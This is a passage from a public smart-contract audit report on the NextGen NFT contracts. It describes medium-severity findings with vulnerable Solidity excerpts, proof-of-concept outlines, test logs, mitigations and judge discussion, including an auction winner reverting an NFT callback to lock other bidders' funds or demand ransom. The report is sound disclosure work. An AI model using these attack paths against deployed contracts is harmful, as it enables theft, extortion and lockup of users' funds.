> 3. Forgery of signature would only make sense for legal purposes and the proof of who signed [artistSignature()](https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L258) is present on the Ethereum blockchain.
> 4. If a collection turns out to be malicious, the NextGen team can just warn users and remove that specific collection from their frontend.
> 
> Due to all of these reasons, this issue should be QA or invalid.

**[0xsomeone (judge) commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/741#issuecomment-1848645283):**
 > @MrPotatoMagic, thanks for providing feedback on this! The submission has been graded as medium in severity due to breaking a core invariant of the protocol, which is that when an artist is associated with a particular collection and has signed it it cannot be altered.
> 
> 1. The response by the Sponsor concerning NextGen administrators **is invalid**. You can evaluate the code yourself and see **that the collection administrator can independently perform these actions with no input from the administrative team of NextGen**.
> 
> 2. The signature is forced because there is no obligation to provide any form of data in the `artistSignature` call. Yes, anyone can go on-chain and see when the `artistSignature` was invoked using off-chain tracking tools but that does not correspond to the on-chain data reality. The on-chain data says that the collection has been signed by an artist who never did so, and this is an irreversible change **even by administrators**.
> 3. See #2 above.
> 4. This is invalid reasoning as the same principle could apply to a wide variety of submissions in this context. 
> 
> **Conclusion** - A core invariant of the protocol has been demonstrated to be possible to break **with no input by the NextGen administrators whatsoever**. Additionally, **this invariant is irreversibly broken** and cannot be rescued even by administrative action.
> 
> As such, I retain my judgment on this submission as being of medium-risk severity.

*Note: For full discussion, see [here](https://github.com/code-423n4/2023-10-nextgen-findings/issues/741).*

***

## [[M-07] Auction winner can prevent payments via `safeTransferFrom` callback](https://github.com/code-423n4/2023-10-nextgen-findings/issues/739)
*Submitted by [The\_Kakers](https://github.com/code-423n4/2023-10-nextgen-findings/issues/739), also found by [Madalad](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1759), [immeas](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1713), [DeFiHackLabs](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1590), [Neon2835](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1579), [xeros](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1545), [Bauchibred](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1406), [fibonacci](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1023), [00decree](https://github.com/code-423n4/2023-10-nextgen-findings/issues/997), [SpicyMeatball](https://github.com/code-423n4/2023-10-nextgen-findings/issues/937), [ChrisTina](https://github.com/code-423n4/2023-10-nextgen-findings/issues/793), [Haipls](https://github.com/code-423n4/2023-10-nextgen-findings/issues/464), [\_eperezok](https://github.com/code-423n4/2023-10-nextgen-findings/issues/368), [bdmcbri](https://github.com/code-423n4/2023-10-nextgen-findings/issues/242), [alexxander](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1925), [0xarno](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1750), [tnquanghuy0512](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1736), [Ocean\_Sky](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1653), [spark](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1422), [Talfao](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1372), [r0ck3tz](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1352), [Arabadzhiev](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1267), [Tricko](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1230), [00xSEV](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1214), [Jiamin](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1196), [nuthan2x](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1167), [lsaudit](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1143), [cu5t0mpeo](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1112), [0x\_6a70](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1075), [bronze\_pickaxe](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1071), [circlelooper](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1041), [rotcivegaf](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1032), [Nyx](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1020), [KupiaSec](https://github.com/code-423n4/2023-10-nextgen-findings/issues/903), [Delvir0](https://github.com/code-423n4/2023-10-nextgen-findings/issues/859), [BugsFinder0x](https://github.com/code-423n4/2023-10-nextgen-findings/issues/811), [crunch](https://github.com/code-423n4/2023-10-nextgen-findings/issues/776), [ke1caM](https://github.com/code-423n4/2023-10-nextgen-findings/issues/752), [twcctop](https://github.com/code-423n4/2023-10-nextgen-findings/issues/683), [Juntao](https://github.com/code-423n4/2023-10-nextgen-findings/issues/642), [0xJuda](https://github.com/code-423n4/2023-10-nextgen-findings/issues/612), [amaechieth](https://github.com/code-423n4/2023-10-nextgen-findings/issues/565), [0xpiken](https://github.com/code-423n4/2023-10-nextgen-findings/issues/532), [funkornaut](https://github.com/code-423n4/2023-10-nextgen-findings/issues/467), [0x180db](https://github.com/code-423n4/2023-10-nextgen-findings/issues/386), [Taylor\_Webb](https://github.com/code-423n4/2023-10-nextgen-findings/issues/366), [BugzyVonBuggernaut](https://github.com/code-423n4/2023-10-nextgen-findings/issues/181), [HChang26](https://github.com/code-423n4/2023-10-nextgen-findings/issues/176), [ZdravkoHr](https://github.com/code-423n4/2023-10-nextgen-findings/issues/155), [Timenov](https://github.com/code-423n4/2023-10-nextgen-findings/issues/122), [dimulski](https://github.com/code-423n4/2023-10-nextgen-findings/issues/81), and [0x3b](https://github.com/code-423n4/2023-10-nextgen-findings/issues/63)*

An auction winner can decide to conditionally revert the `claimAuction()` execution.

This leads to the following impacts:

- Other bidders can't get their funds back
- The protocol doesn't receive the funds from the winning bid

This can lead to permanent loss of funds if the adversary decides to. As a drawback, they can't get the NFT.

But nevertheless, they can use their control over the function to ask for a ransom, as the sum of other bids, plus the protocol earnings can be higher than the maximum bid itself and the damaged public image of the protocol for losing users funds.

It also breaks one of the [main invariants of the protocol](https://github.com/code-423n4/2023-10-nextgen#main-invariants):

> Properties that should NEVER be broken under any circumstance:
>
> - The highest bidder will receive the token after an auction finishes, **the owner of the token will receive the funds** and **all other participants will get refunded**.

Evaluated as Medium, as despite of the possibility of permanent assets lost, and breaking a main invariant, the adversary will have to take a loss as well; or persuade the participants via a ransom.

### Proof of Concept

`claimAuction()` transfers the NFT using `safeTransferFrom()`:

```solidity
    function claimAuction(uint256 _tokenid) public WinnerOrAdminRequired(_tokenid,this.claimAuction.selector){
        /// ...
        for (uint256 i=0; i< auctionInfoData[_tokenid].length; i ++) {
            if (auctionInfoData[_tokenid][i].bidder == highestBidder && auctionInfoData[_tokenid][i].bid == highestBid && auctionInfoData[_tokenid][i].status == true) {
->              IERC721(gencore).safeTransferFrom(ownerOfToken, highestBidder, _tokenid); // @audit adversary can make it revert
->              (bool success, ) = payable(owner()).call{value: highestBid}(""); // @audit funds not transferred
                emit ClaimAuction(owner(), _tokenid, success, highestBid);
            } else if (auctionInfoData[_tokenid][i].status == true) {
->                (bool success, ) = payable(auctionInfoData[_tokenid][i].bidder).call{value: auctionInfoData[_tokenid][i].bid}(""); // @audit funds not transferred
                emit Refund(auctionInfoData[_tokenid][i].bidder, _tokenid, success, highestBid);
            } else {}
        }
    }
```

`safeTransferFrom()` [calls back the receiver](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/ERC721.sol#L407) if it is a contract.

An adversary that won the auction can conditionally `revert` the execution of the transaction, upon the `onERC721Received()` callback.

This will revert the whole transaction, making it impossible to transfer any funds.

Bidders can't cancel their bids either via `cancelBid()` or `cancelAllBids()`, due to they only allow it to do so if the auction was not ended: [AuctionDemo.sol#L125](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L125)

The protocol, nor the previous token owner have a way to claim the earnings from the auction.

### Recommended Mitigation Steps

Move the logic to transfer the NFT to its own separated function.

### Assessed type

DoS

**[0xsomeone (judge) commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/739#issuecomment-1839426119):**
 > The Warden specifies that the winning bidder may not implement a proper EIP-721 receive hook either deliberately or by accident.
> 
> I consider this to be an exhibit validly categorized as a medium given that its impact is sabotage (i.e. loss-of-funds for other users) at the expense of a single high bid and it can also be used as extortion.
> 
> This submission was selected as the best given that it cites the voidance of a main invariant of the protocol, articulates that the funds are irrecoverable, and mentions that it should be marked as a medium given that the attacker would also lose their bid.

**[btk (warden) commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/739#issuecomment-1848428010):**
 > @0xsomeone, while #739 could be critical, the high cost makes it unlikely. To execute the attack, the malicious actor must win an auction, risking their funds to lock others' funds, which is impractical in real-world scenarios. You can check [#1508](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1508) where I discussed the issue without providing a PoC, as it is QA at max, here:
> 
> > Attackers can exploit this using `onERC721Received` too, but it's costlier since they need to be the highest bidder to claim the NFT.

**[0xsomeone (judge) commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/739#issuecomment-1848585215):**
 > @btk, thanks for your contribution! I believe you are misjudging why this was selected as a medium-risk vulnerability while [#734](https://github.com/code-423n4/2023-10-nextgen-findings/issues/734) is a high-risk vulnerability.
> 
> Yes, the would-be attacker would need to be the winning bidder but they would acquire an NFT regardless that would offset the cost of the attack. Additionally, any bidder can simply "choose" to carry this attack or simply acquire the NFT. Specifying that the attack would be impractical is identical to saying users would not participate in auctions and win. 
> 
> The likelihood might be low, but the impact is high rendering this an aptly graded medium-risk vulnerability. #734 has a lower bar of entry and has been marked as high-risk as such. This was already elaborated [in the relevant comment of this submission](https://github.com/code-423n4/2023-10-nextgen-findings/issues/739#issuecomment-1839426119).

**[a2rocket (NextGen) confirmed](https://github.com/code-423n4/2023-10-nextgen-findings/issues/739#issuecomment-1876732920)**

*Note: For full discussion, see [here](https://github.com/code-423n4/2023-10-nextgen-findings/issues/739).*

***

## [[M-08] If an airdrop happens before a mint the price could skyrocket](https://github.com/code-423n4/2023-10-nextgen-findings/issues/381)
*Submitted by [0x3b](https://github.com/code-423n4/2023-10-nextgen-findings/issues/381), also found by [AvantGard](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1937) and [lanrebayode77](https://github.com/code-423n4/2023-10-nextgen-findings/issues/246)*

As explained by the [docs](https://seize-io.gitbook.io/nextgen/nextgen-smart-contracts/features#minting-process), several steps can occur during the minting process. However, an airdrop before `salesOption` 3 can lead to price inflation.

### Proof of Concept

Under `salesOption` 3, [getPrice](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L536) returns:

```solidity
return collectionPhases[_collectionId].collectionMintCost
                    + ((collectionPhases[_collectionId].collectionMintCost / collectionPhases[_collectionId].rate) * gencore.viewCirSupply(_collectionId));
```

This is the increased rate based on the NFTs **already in circulation**. If an airdrop occurs before a mint with `salesOption` 3, the price will be much higher than intended.

Example:

| Steps         | Option     | NFTs    | Price | Rate                  |
| ------------- | ---------- | ------- | ----- | --------------------- |
| 1 OG users    | Airdropped | 20 NFTs | free  | -                     |
| 2 Whitelisted | Sales 3    | 10 NFTs | 1 ETH | 10 (0.1 ETH increase) |
| 3 Public      | Sales 1    | 70 NFTs | 2 ETH | -                     |

With the current three steps, after the airdrop, `salesOption` 3 should start at 1 ETH and gradually increase to 2 ETH. Afterward, it should mint at a constant rate of 2 ETH.

However, when sales option 3 starts, [getPrice](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L536) will return 3 ETH instead of 1 ETH. This will cause the initial users to pay an inflated price, which was not intended by the owner and can harm their reputation. It's also unfair to the users, as these so-called special (whitelisted) users will pay increased prices.

*Note: see [original submission](https://github.com/code-423n4/2023-10-nextgen-findings/issues/381) for math breakdown provided.*


### POC

Gist [here](https://gist.github.com/0x3b33/558b919a57101e7a0942e557a464078a). 

Add to remappings - `contracts/=smart-contracts/` and run it with `forge test --match-test test_airdrop  --lib-paths ../smart-contracts`.

### Recommended Mitigation Steps

You can implement a mapping with the airdropped NFTs and deduct this value from `gencore.viewCirSupply(_collectionId)` to avoid disrupting the minting process.

### Assessed type

Error

**[a2rocket (NextGen) confirmed via duplicate issue #246](https://github.com/code-423n4/2023-10-nextgen-findings/issues/246#issuecomment-1824028646)**

**[0xsomeone (judge) commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/381#issuecomment-1845253491):**
 > After further consideration, I have decided to merge several periodic mint-related findings into two separate categories:
> 
> - Incorrect Price Calculations ([#381](https://github.com/code-423n4/2023-10-nextgen-findings/issues/381))
> - Incorrect Enforcement of Periodic Mint Limitations ([#380](https://github.com/code-423n4/2023-10-nextgen-findings/issues/380)) 
> 
> The reasoning behind this change is that both rely on different aspects of the code and have different root causes. The former highlights a flaw in the `getPrice` function and how it calculates prices, whilst the latter highlights a flaw in the `mint` function and how it calculates the `lastMintDate`. Fixing one does not infer that the other is fixed, reinforcing the idea that they are separate vulnerabilities.
> 
> I consider this submission to be of a lower severity than #380, correctly given that it can be rectified. Specifically, a `lastMintDate` update in the future per [#2012](https://github.com/code-423n4/2023-10-nextgen-findings/issues/2012) **cannot be reversed**, while an incorrect price as indicated in this and relevant submissions can be reversed by reconfiguring the collection and can be controlled by the user simply not willing to pay the inflated price until the price is corrected.
> 
> A problem when selecting the best report in this submission is that all Warden submissions make mention of "airdropped" tokens and fail to identify **that the general circulating supply affects the price in their proposed remediation**, such as #380. I have thus chosen this report as the best given that it cites the relevant documentation, contains a privately accessible valid PoC, and provides a basic representation of the pricing formula using mathematical notation to illustrate the problem.

**[MrPotatoMagic (warden) commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/381#issuecomment-1848456338):**
 > @0xsomeone, here is why I believe this issue (and its duplicates) should be marked as a duplicate of #380 but with a partial grading.
> 
> 1. The root cause is the same, i.e. existing circulating supply causes sale model 3 to work incorrectly.
> 2. The impact mentioned here and that in #380 are two sides of the same coin.
> 3. The issue mentions that prices will skyrocket (which is true) but the issue also mentions that `initial users to pay an inflated price`, which is incorrect since the user cannot mint (pay) in the first place due to the `lastMintDate` being set to a date far ahead in the future.
> 4. I mention partial grading because although the root cause is correct, the impact demonstrated is invalid. Thus, according to the [C4 final SC verdict in the docs](https://docs.code4rena.com/awarding/judging-criteria/supreme-court-decisions-fall-2023#verdict-penalty-award-standardization-duplicate-report-poc-thoroughness), the issue should deserve a partial-grading, while being marked as a dup of #380 due to the root cause being the same.

**[0xsomeone (judge) commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/381#issuecomment-1848638016):**
 > @MrPotatoMagic, thanks for contributing! The root cause is not the presence of the circulating supply, it is the incorrect price calculation of a sale model 3. **While it may make sense to carry over sale model 3 sales across different periods, it does not make sense to carry over mint restrictions**. For example:
> 
> - Collection A runs a periodic sale, amassing 10 NFTs sold, and reaching a price of 10 ETH per NFT.
> - Collection A performs an airdrop as part of an incentive program.
> - Collection A opens up the periodic sale for a public run, wanting to maintain the 10 ETH per NFT price.
> 
> To fix this:
> - Issue 381 would need to update its price calculation to use solely the circulating supply minted via the periodic sale.
> - Issue 380 would need to **reset its `lastMintDate` entirely**.
> 
> A fix for #380 does not fix #381 and vice versa. Both concern different parts of the code and require different alleviations.
>
> Based on the above, I will maintain these submissions as separate. 

***

## [[M-09] `getPrice` `salesOption` 2 can round down to the lower barrier, skipping the last time period](https://github.com/code-423n4/2023-10-nextgen-findings/issues/271)
*Submitted by [0x3b](https://github.com/code-423n4/2023-10-nextgen-findings/issues/271), also found by [dimulski](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1528), [KupiaSec](https://github.com/code-423n4/2023-10-nextgen-findings/issues/904), [t0x1c](https://github.com/code-423n4/2023-10-nextgen-findings/issues/845), [ZdravkoHr](https://github.com/code-423n4/2023-10-nextgen-findings/issues/360), [degensec](https://github.com/code-423n4/2023-10-nextgen-findings/issues/273), and [REKCAH](https://github.com/code-423n4/2023-10-nextgen-findings/issues/393)*

[getPrice](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L530) in `salesOption` 2 can round down to the lower barrier, effectively skipping the last time period. In simpler terms, if the price is scheduled to decrease over 4 hours, it will decrease for 2.999... hours and then jump to the price at the end of the 4th hour.

### Proof of Concept

[getPrice](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L530) uses [this else-if calculation](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L553) to determine whether it should return the price as an equation or just the final price.

```solidity
if (((collectionMintCost - collectionEndMintCost) / rate) > tDiff) {
    price = collectionPhases[_collectionId].collectionMintCost - (tDiff * collectionPhases[_collectionId].rate);
} else {
    price = collectionPhases[_collectionId].collectionEndMintCost;
}
```

The `if` statement's method of division by `rate` is incorrect, as it results in rounding down and incorrect price movements. This can cause the price to jump over the last time period, effectively decreasing faster than intended.

Example:

| Values                  |                    |
| ----------------------- | ------------------ |
| `collectionMintCost`    | 0.49 ETH           |
| `collectionEndMintCost` | 0.1 ETH            |
| `rate`                  | 0.1 ETH (per hour) |
| `timePeriod`            | 1 hour - 3600 sec  |

Hour 0 to 1 - 0.49 ETH.<br>
Hour 1 to 2 - 0.39 ETH - as it crosses the 1st hour, the price becomes 0.39 ETH.<br>
Hour 2 to 3 - 0.29 ETH - same here.<br>
It should go from 3 to 4 to 0.19 ETH, but that step is missed, and it goes directly to 0.1 ETH - the final price.<br>
Hour 3 to 4 - 0.10 ETH - the final price.

### Math

The equation for calculating `tDiff` using the provided variables is:

*Note: see [original submission](https://github.com/code-423n4/2023-10-nextgen-findings/issues/271) for math breakdown provided.*

We want the crossover when hour 2 switches to 3, which is when `(block.timestamp - collectionPhases[_collectionId].allowlistStartTime)` = 3 h or 10800 sec.

*Note: see [original submission](https://github.com/code-423n4/2023-10-nextgen-findings/issues/271) for math breakdown provided.*


We plug in `tDiff` and the other variables into the [if](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L553).

```solidity
if (((collectionPhases[_collectionId].collectionMintCost - collectionPhases[_collectionId].collectionEndMintCost) 
                / (collectionPhases[_collectionId].rate)) > tDiff) {
```

*Note: see [original submission](https://github.com/code-423n4/2023-10-nextgen-findings/issues/271) for math breakdown provided.*

We obtain 3 as the answer, which is due to rounding down, as we divide 0.39 by 0.1. Solidity only works with whole numbers, causing the [if](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L553) to fail as `3 > 3` is false. This leads to entering the else statement where the last price of 0.1 ETH is returned, effectively missing one step of the 4-hour decrease.

### PoC

Gist [here](https://gist.github.com/0x3b33/ab8a384f9979c4a9b7c4777be00a78de).

Add `contracts/=smart-contracts/` to mappings and run it with `forge test --match-test test_changeProof  --lib-paths ../smart-contracts -vv`.

Logs:

    [PASS] test_changeProof() (gas: 745699)
    Logs:
      4900000000000000000
      3900000000000000000
      2900000000000000000
      1000000000000000000

### Recommended Mitigation Steps

A simple yet effective suggestion is to add `=` in the [if](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L553).

```diff
-  if (...) > tDiff){ 
+  if (...) >= tDiff){ 
```

### Assessed type

Error

**[a2rocket (NextGen) confirmed via duplicate issue #393](https://github.com/code-423n4/2023-10-nextgen-findings/issues/393#issuecomment-1822845813)**

**[0xsomeone (judge) commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/271#issuecomment-1841801838):**
 > The Warden illustrates that a rounding error can result in a price that is lower than the actual one for a particular period.
> 
> The relevant rounding issue has been detected by the bot in [L-17](https://github.com/code-423n4/2023-10-nextgen/blob/main/bot-report.md#l-17-loss-of-precision-on-division), however, it is designated as a low-risk finding and the attack path that the Warden illustrates is not immediately clear by consuming the bot report submission. 
> 
> The C4 Supreme Court verdict [did not finalize on issues based entirely on bot findings](https://docs.google.com/document/d/1Y2wJVt0d2URv8Pptmo7JqNd0DuPk_qF9EPJAj3iSQiE/edit#heading=h.vljs3xbfn8cj) and as such, I will deem this exhibit a valid medium-severity submission given that:
> 
> - It takes a low-risk bot report and illustrates that it should be treated as a medium-severity issue that is not immediately discernible by consuming the bot report alone.
> - The bot report's mitigation would not lead to the loss of precision being resolved as it states that:
> 
>   > ...it's recommended to require a minimum numerator amount to ensure that it is always greater than the denominator
> 
> The Warden's submission was selected as the best due to their clear depiction of the issue using mathematical formulas, a provision of both textual and coded PoCs, and a simple remediation path.

***

## [[M-10] Bidder Funds Can Become Unrecoverable Due to 1 second Overlap in `participateToAuction()` and `claimAuction()`](https://github.com/code-423n4/2023-10-nextgen-findings/issues/175)
*Submitted by [HChang26](https://github.com/code-423n4/2023-10-nextgen-findings/issues/175), also found by [immeas](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1696), [sces60107](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1659), [phoenixV110](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1642), [Neon2835](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1603), [tnquanghuy0512](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1576), [c3phas](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1562), [lsaudit](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1153), [MrPotatoMagic](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1094), [ayden](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1038), [volodya](https://github.com/code-423n4/2023-10-nextgen-findings/issues/988), [oakcobalt](https://github.com/code-423n4/2023-10-nextgen-findings/issues/962), [Kow](https://github.com/code-423n4/2023-10-nextgen-findings/issues/786), [DeFiHackLabs](https://github.com/code-423n4/2023-10-nextgen-findings/issues/706), [t0x1c](https://github.com/code-423n4/2023-10-nextgen-findings/issues/676), [xAriextz](https://github.com/code-423n4/2023-10-nextgen-findings/issues/419), [ubl4nk](https://github.com/code-423n4/2023-10-nextgen-findings/issues/341), [peanuts](https://github.com/code-423n4/2023-10-nextgen-findings/issues/214), [oualidpro](https://github.com/code-423n4/2023-10-nextgen-findings/issues/82), [0x3b](https://github.com/code-423n4/2023-10-nextgen-findings/issues/75), [0xMAKEOUTHILL](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1926), [merlin](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1915), [0xSwahili](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1527), [innertia](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1489), [mojito\_auditor](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1451), [0xarno](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1444), [Haipls](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1371), [Eigenvectors](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1242), [alexfilippov314](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1034), [Nyx](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1030), [ohm](https://github.com/code-423n4/2023-10-nextgen-findings/issues/932), [Zac](https://github.com/code-423n4/2023-10-nextgen-findings/issues/503), and [ABA](https://github.com/code-423n4/2023-10-nextgen-findings/issues/92)*

### Lines of code

<https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L57><br>
<https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/AuctionDemo.sol#L104>

### Impact

Bidder funds may become irretrievable if the `participateToAuction()` function is executed after `claimAuction()` during a 1-second overlap.

### Proof of Concept

The protocol allows bidders to use the `participateToAuction()` function up to the auction's end time.

```solidity
    function participateToAuction(uint256 _tokenid) public payable {
      ->require(msg.value > returnHighestBid(_tokenid) && block.timestamp <= minter.getAuctionEndTime(_tokenid) && minter.getAuctionStatus(_tokenid) == true);
        auctionInfoStru memory newBid = auctionInfoStru(msg.sender, msg.value, true);
        auctionInfoData[_tokenid].push(newBid);
    }
```

However, the issue arises when an auction winner immediately calls `claimAuction()` right after the auction concludes, creating a 1-second window during which both `claimAuction()` and `participateToAuction()` can be executed.

```solidity
    function claimAuction(uint256 _tokenid) public WinnerOrAdminRequired(_tokenid,this.claimAuction.selector){
      ->require(block.timestamp >= minter.getAuctionEndTime(_tokenid) && auctionClaim[_tokenid] == false && minter.getAuctionStatus(_tokenid) == true);
        auctionClaim[_tokenid] = true;
        uint256 highestBid = returnHighestBid(_tokenid);
        address ownerOfToken = IERC721(gencore).ownerOf(_tokenid);
        address highestBidder = returnHighestBidder(_tokenid);
        for (uint256 i=0; i< auctionInfoData[_tokenid].length; i ++) {
            if (auctionInfoData[_tokenid][i].bidder == highestBidder && auctionInfoData[_tokenid][i].bid == highestBid && auctionInfoData[_tokenid][i].status == true) {
                IERC721(gencore).safeTransferFrom(ownerOfToken, highestBidder, _tokenid);
                (bool success, ) = payable(owner()).call{value: highestBid}("");
                emit ClaimAuction(owner(), _tokenid, success, highestBid);
            } else if (auctionInfoData[_tokenid][i].status == true) {
                (bool success, ) = payable(auctionInfoData[_tokenid][i].bidder).call{value: auctionInfoData[_tokenid][i].bid}("");
                emit Refund(auctionInfoData[_tokenid][i].bidder, _tokenid, success, highestBid);
            } else {}
        }
    }
```

The issue arises when `claimAuction()` is executed before `participateToAuction()` within this 1-second overlap. In such a scenario, the bidder's funds will become trapped in `AuctionDemo.sol` without any mechanism to facilitate refunds. Both `cancelBid()` and `cancelAllBids()` functions will revert after the auction's conclusion, making it impossible for bidders to recover their funds.

### Recommended Mitigation Steps

```solidity
    function participateToAuction(uint256 _tokenid) public payable {
-       require(msg.value > returnHighestBid(_tokenid) && block.timestamp <= minter.getAuctionEndTime(_tokenid) && minter.getAuctionStatus(_tokenid) == true);
+       require(msg.value > returnHighestBid(_tokenid) && block.timestamp < minter.getAuctionEndTime(_tokenid) && minter.getAuctionStatus(_tokenid) == true);
        auctionInfoStru memory newBid = auctionInfoStru(msg.sender, msg.value, true);
        auctionInfoData[_tokenid].push(newBid);
    }
```

### Assessed type

Context

**[a2rocket (NextGen) confirmed via duplicate issue #962](https://github.com/code-423n4/2023-10-nextgen-findings/issues/962#issuecomment-1822926107)**

**[0xsomeone (judge) commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/175#issuecomment-1838613170):**
 > The Warden has clearly specified what the vulnerability is, has provided a recommended course of action that aligns with best practices, and has specified all aspects of the contract that would fail for the user if they tried to reclaim their lost funds.
> 
> The likelihood of this exhibit manifesting in practice is relatively low (requires a `block.timestamp` that exactly matches the auction). In the post-merge PoS Ethereum that the project intends to deploy, blocks **are guaranteed to be multiples of `12` and can only be manipulated as multiples of it**. 
> 
> The impact is high, as the funds of the user are irrecoverably lost even with administrative privileges as no rescue mechanism exists, rendering this exhibit a medium severity issue.

*Note: For full discussion, see [here](https://github.com/code-423n4/2023-10-nextgen-findings/issues/175).*

***

## [M-11] Unchecked return value of low-level `call()/delegatecall()`

*Submitted by [Hound](https://gist.github.com/code423n4/b979a00ee3ea3f7d36ee39e2a536ba8a#m-01-unchecked-return-value-of-low-level-calldelegatecall)*

*Note: this finding was reported via the winning [Automated Findings report](https://gist.github.com/code423n4/b979a00ee3ea3f7d36ee39e2a536ba8a). It was declared out of scope for the audit, but is being included here for completeness.*

The `call/delegatecall` function returns a boolean value indicating whether the call was successful. However, it is important to note that this return value is not being checked in the current implementation.

As a result, there is a possibility that the call wasn't successful, while the transaction continues without reverting.

*There are 11 instances of this issue.*

```solidity
File: smart-contracts/AuctionDemo.sol

113: 		                (bool success, ) = payable(owner()).call{value: highestBid}("");

116: 		                (bool success, ) = payable(auctionInfoData[_tokenid][i].bidder).call{value: auctionInfoData[_tokenid][i].bid}("");

128: 		        (bool success, ) = payable(auctionInfoData[_tokenid][index].bidder).call{value: auctionInfoData[_tokenid][index].bid}("");

139: 		                (bool success, ) = payable(auctionInfoData[_tokenid][i].bidder).call{value: auctionInfoData[_tokenid][i].bid}("");
```
[[113](https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/AuctionDemo.sol#L113), [116](https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/AuctionDemo.sol#L116), [128](https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/AuctionDemo.sol#L128), [139](https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/AuctionDemo.sol#L139)]

```solidity
File: smart-contracts/MinterContract.sol

434: 		        (bool success1, ) = payable(collectionArtistPrimaryAddresses[colId].primaryAdd1).call{value: artistRoyalties1}("");

435: 		        (bool success2, ) = payable(collectionArtistPrimaryAddresses[colId].primaryAdd2).call{value: artistRoyalties2}("");

436: 		        (bool success3, ) = payable(collectionArtistPrimaryAddresses[colId].primaryAdd3).call{value: artistRoyalties3}("");

437: 		        (bool success4, ) = payable(tm1).call{value: teamRoyalties1}("");

438: 		        (bool success5, ) = payable(tm2).call{value: teamRoyalties2}("");

464: 		        (bool success, ) = payable(admin).call{value: balance}("");
```
